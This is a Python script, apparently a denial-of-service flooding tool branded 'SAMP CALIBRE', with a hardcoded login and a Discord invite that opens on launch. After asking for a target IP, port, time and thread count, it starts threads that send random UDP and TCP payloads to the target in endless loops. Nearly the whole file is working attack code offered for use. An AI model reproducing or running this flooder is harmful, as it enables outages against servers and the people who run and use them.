#AUTHOR SAMP CALIBRE 
 import random 
 import socket 
 import threading 
 import os 
 import sys 
 import time 
  
 ###### MESSAGE SAINT ON TOP! ##### 
 os.system("clear") 
 os.system("xdg-open https://discord.gg/nNuzbvPTac") 
 print("\u001b[35m Welcome to SAMP-CALIBRE World") 
 time.sleep(2) 
 print("Loading.......") 
 os.system("clear") 
  
 #### Login        
  
 attemps = 0 
  
 while attemps < 100: 
     username = input('Enter your username: ') 
     password = input('Enter your password: ') 
  
     if username == 'SAINT' and password == 'SAINT': 
         print('You have successfully logged in Welcome to CALIBRE!!') 
         break 
     else: 
         print('Incorrect credentials. Check if you have Caps lock on and try again.') 
         attemps += 1 
         continue 
 os.system("clear") 
  
 print(""" 
 \u001b[35m 
           AUTHOR TOOLS : SAMP CALIBRE
               ╔═══╗╔═══╗╔╗───╔══╗╔══╗─╔═══╗╔═══╗     ╔═══╗╔═══╗╔═══╗╔═══╗
               ║╔═╗║║╔═╗║║║───╚╣─╝║╔╗║─║╔═╗║║╔══╝     ╚╗╔╗║╚╗╔╗║║╔═╗║║╔═╗║
               ║║─╚╝║║─║║║║────║║─║╚╝╚╗║╚═╝║║╚══╗     ─║║║║─║║║║║║─║║║╚══╗
               ║║─╔╗║╚═╝║║║─╔╗─║║─║╔═╗║║╔╗╔╝║╔══╝     ─║║║║─║║║║║║─║║╚══╗║
               ║╚═╝║║╔═╗║║╚═╝║╔╣─╗║╚═╝║║║║╚╗║╚══╗     ╔╝╚╝║╔╝╚╝║║╚═╝║║╚═╝║
               ╚═══╝╚╝─╚╝╚═══╝╚══╝╚═══╝╚╝╚═╝╚═══╝     ╚═══╝╚═══╝╚═══╝╚═══╝ V 1.5 
 """) 
  
 ip = str(input(" Target IP :")) 
 port = int(input(" Target Port :")) 
 choice = str(input(" (y/n) :")) 
 times = int(input(" Time :")) 
 threads = int(input(" Threads :")) 
 def run(): 
         data = random._urandom(1024) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         print("[!] CALIBRE ON TOP!!") 
  
 def run2(): 
         data = random._urandom(999) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         s.close() 
                         print("[*] CALIBRE ON TOP!!") 
  
  
 def run3(): 
         data = random._urandom(818) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         s.close() 
                         print("[*] CALIBRE ON TOP!!") 
  
  
 def run4(): 
         data = random._urandom(16) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +"Attack Sent!!!") 
                 except: 
                         s.close() 
                         print("[*] CALIBRE ON TOP!!") 
  
  
 for y in range(threads): 
         if choice == 'y': 
                 th = threading.Thread(target = run) 
                 th.start() 
                 th = threading.Thread(target = run2) 
                 th.start() 
                 th = threading.Thread(target = run3) 
                 th.start() 
 else: 
                 th = threading.Thread(target = run4) 
                 th.start()